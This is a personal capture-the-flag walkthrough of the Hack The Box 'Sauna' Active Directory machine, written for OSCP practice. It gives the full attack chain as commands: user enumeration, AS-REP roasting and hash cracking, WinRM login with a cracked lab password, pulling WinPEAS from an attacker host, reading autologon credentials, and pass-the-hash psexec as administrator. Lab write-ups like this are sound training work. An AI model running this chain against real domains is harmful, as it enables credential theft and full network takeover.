---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Sauna?tab=machine_info
Difficulty: Easy
Featured:
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Sauna-1791211996898.webp)

![263](../../0.%20Assets/Sauna-1791212003944.webp)

---

# Walkthrough



We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap $T -sS -Pn -n -p- --min-rate 5000 -oG openPorts.gmap -vvv
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

Here you can find the dotfiles for kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

```
nmap $T -Pn -n -sVC  --min-rate 3000 -oN results.txt -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49688,49696
```

The usual stuff

```
netexec smb $T

SMB         10.129.95.180   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
```


Let's add the domain we discovered to the `/etc/hosts`, this is because `kerberos` usually requires name resolution.

![](../../0.%20Assets/Sauna-1791212433483.webp)

Let's do some enumeration with netexec, anonymous and guest users

All the combinations didn't work so I moved to RPC and I still couldn't get a hold of anything.

Then I realized that the AD has a website
![](../../0.%20Assets/Sauna-1791212836295.webp)

I tried some brute forcing while I searched for stuff like `robots.txt` 

```
gobuster dir -u http://$T -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_dire
ctory-list-2.3-medium.txt -t 50
```

While the dirbuster was running I found something interesting

![](../../0.%20Assets/Sauna-1791213011587.webp)


Let's try generating a list of possible users with this tool [AD-Username-Generator](https://github.com/mohinparamasivam/AD-Username-Generator?utm_source=chatgpt.com)

so let's make a list with the users and run the tool

![](../../0.%20Assets/Sauna-1791213230283.webp)

```
git clone https://github.com/mohinparamasivam/AD-Username-Generator.git

touch possibleUsers.txt
python3 username-generate.py -u ../possible_users.txt -o possibleUsers.txt
```

![](../../0.%20Assets/Sauna-1791213368723.webp)

Now we have a list of possible users, let's find out if any of these users actually exist

```
./kerbrute userenum --dc $T -d egotistical-bank.local possibleUsers.txt
```

![](../../0.%20Assets/Sauna-1791213699436.webp)

And we have a user!

Cool let's add it to a user list for credentials

Okay next logical step is to `as-rep` roast and try to get the hash for `Fsmith`

```
impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/Fsmith' \             
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```

![](../../0.%20Assets/Sauna-1791213905027.webp)

Nice !

Let's crack it

```
hashcat -m 18200 asrep-impacket.txt /usr/share/wordlists/rockyou.txt
```

![](../../0.%20Assets/Sauna-1791213981693.webp)

Nice!! let's see what we can do with this new credentials

I used [nxcspray](https://github.com/NTHSec/nxcspray) to test all protocols with these credentials.

```
./nxcspray all $T -u 'Fsmith' -p 'Thestrokes23'
```

![](../../0.%20Assets/Sauna-1791214233233.webp)

Great, we can remotely connect to the machine via `WINRM` we will use `evil-winrm` for that

```
evil-winrm -i $T -u Fsmith -p 'Thestrokes23'
```

![](../../0.%20Assets/Sauna-1791214381991.webp)

And as usual, I like to use `penelope` for reverse shells

```
penelope -O -p 1337 -a -i tun0
```

![](../../0.%20Assets/Sauna-1791214466671.webp)


![](../../0.%20Assets/Sauna-1791214608468.webp)

And there we can find the flag

I will now recollect data for bloodhound, I wanted to try `rusthound-ce` and I have to say I worked really well, I would recommend it

```
 ./rusthound-ce -d EGOTISTICAL-BANK.LOCAL -u 'Fsmith@EGOTISTICAL-BANK.LOCAL' -p 'Thestrokes23' -f $T -z
```


![](../../0.%20Assets/Sauna-1791217668385.webp)

I don't immediately see a path, so let's do some enumeration, Trying ``PowerUp`` the session breaks so I tried ``winPeas``, and it still broke so i got out of Penelope

``
```
iwr -uri http://10.10.15.226/WinPEASx64.exe -Outfile WinPEASx64.exe

./WinPEASx64.exe
```

I found some Auto logon credentials
We can see more information with this command

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

![](../../0.%20Assets/Sauna-1791222811125.webp)

![](../../0.%20Assets/Sauna-1791222857499.webp)

And thanks to us doing some enumeration with bloodhound we find that we can perform a `DCSync` on the domain


![](../../0.%20Assets/Sauna-1791224159891.webp)

```
impacket-psexec EGOTISTICAL-BANK.LOCAL/administrator@10.129.158.187 -hashes :823452073d75b9d1cf70ebdf86c7f98e
```

![](../../0.%20Assets/Sauna-1791224338543.webp)